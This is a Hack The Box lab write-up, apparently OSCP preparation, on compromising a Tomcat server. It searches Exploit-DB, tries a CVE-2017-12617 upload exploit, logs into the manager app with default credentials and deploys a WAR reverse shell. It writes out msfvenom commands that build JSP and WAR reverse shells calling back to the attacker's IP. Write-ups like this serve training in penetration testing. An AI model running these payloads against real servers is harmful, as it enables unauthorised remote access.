# Tomcat

## Webpage

The website, on `http://10.10.10.95:8080`, is just the default page for Apache Tomcat:

![[Pasted image 20210504124212.png]]

### Shell Page

Navigating to `http://10.10.10.95/shell/` returns a blank white page:

![[Pasted image 20210504131221.png]]

There is nothing in the source:

![[Pasted image 20210504131242.png]]

## Tomcat Version

The version number is exposed both in the `nmap` scan and on the page itself. Let's search Exploit DB:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/jerry]
└─$ searchsploit tomcat 7.0
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat 7.0.4 - 'sort' / 'orderBy' Cross-Site Scripting                                                                                                          | linux/remote/35011.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                                           | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                           | jsp/webapps/42966.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We might be able to upload a JSP shell.

## Trying CVE-2017-12617 Exploit

Looking at the exploit with `searchsploit -x jsp/webapps/42966.py`, it seems to reference CVE-2017-12617, which it uses to upload a webshell:

![[Pasted image 20210504124851.png]]

The code seems to generate a JSP payload and upload it directly to the box, using the following two methods:

![[Pasted image 20210504124931.png]]

### Running the Exploit

I initially thought that we had to generate our own shellcode in JSP to point back to our box, and that the exploit just uploads the file. However, it turns out the program actually generates a shell. The `pwn` parameter seems to be just a filename.

Nevertheless, I will quickly go over what I did to generate a `.jsp` shell payload:
- I ran some quick [[Writeups/Hack the Box/Boxes/Jerry/5 - Enumeration#Enumerating OS|OS Enumeration]] to check the operating system, as I wasn't sure at this point (we can cheat and look at the box info on HTB, but that's no fun)
- Created a payload with `msfvenom --f jsp -p windows/shell_reverse_tcp lhost=10.10.14.13 lport=9001 -o shell.jsp`
- Started a [[netcat]] listener and tried running the exploit with `python2 42966.py -u http://10.10.10.95:8080 -p shell.jsp`

Now I knew this wasn't necessary, I changed my syntax, just providing the name `shell`. However, running it again with these options just gave me a 404 `resource is not available` error:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/jerry]
└─$ python2 42966.py -u http://10.10.10.95:8080 -p shell



   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /  
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
                                                                           
                                                                           

[@intx0x80]


Uploading Webshell .....
$ id

Apache Tomcat/7.0.88 - Error report

 
HTTP Status 404 - /shell.jsp

type
 Status report
message
 
/shell.jsp

description
 
The requested resource is not available.

Apache Tomcat/7.0.88
```

I also tried navigating to it in browser at `http://10.10.10.95/shell.jsp`, and even tried `http://10.10.10.95/shell/shell.jsp` in case it went to that directory - but both of these also gave me a 404.

Looking at the [CVE details](https://access.redhat.com/security/cve/cve-2017-12617), the resource needs to not be in readonly mode, and allow `PUT` requests:

![[Pasted image 20210504132129.png]]

This also states that it only affects Linux machines. So we may be barking up the wrong tree.

## Alternate Exploit

The other option, `windows/webapps/42953.txt`, seems to be tailored to windows. Running `searchsploit -x windows/webapps/42953.txt` gives an overview of the request structure needed.

![[Pasted image 20210504132312.png]]

I pasted this directly into Burp Repeater, and just had to configure the host:

![[Pasted image 20210504133101.png]]

My first attempt gave me a blank response, so I made sure to change the referer header to match the current IP just in case, and sent again:

![[Pasted image 20210504133324.png]]

The response was also blank, so I just went and checked if the shell had been uploaded. However, `http://10.10.10.95/1.jsp` also gave me a 404.

## Manager Console

I decided to change my strategy and look at something else. I went back to the main site, and navigated to the manager app.

Here I was prompted for some credentials. I tried the default login for Tomcat, `tomcat`:`s3cret`:

![[Pasted image 20210504133752.png]]

I was in!

### WAR File Shell

Now the next step was to use this to upload a shell. Scrolling down there was an option to deploy a WAR file:

![[Pasted image 20210504133840.png]]

I did a quick check in `/usr/share/webshells` to see if there was a folder for `WAR` files, but there wasn't - so I went to `msfvenom` instead:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/jerry]
└─$ msfvenom -p java/shell_reverse_tcp lhost=10.10.14.13 lport=9001 -f war -o warshell.war
Payload size: 13400 bytes
Final size of war file: 13400 bytes
Saved as: warshell.war
```

I found a good guide when searching "kali war shell" that took me through this process: [https://www.ethicaltechsupport.com/blog-post/apache-tomcat-war-backdoor/](https://www.ethicaltechsupport.com/blog-post/apache-tomcat-war-backdoor/)

I then selected the file on my box and clicked deploy:

![[Pasted image 20210504135209.png]]

We can then visit `http://10.10.10.95/warshell`:

![[Pasted image 20210504135400.png]]

Which spawns a shell:

![[Pasted image 20210504142751.png]]

And we can grab both flags:

![[Pasted image 20210504143146.png]]

That's the box!

![[Pasted image 20210504145745.png]]

# Tags

#writeup #oscp-prep #windows #file-upload #tomcat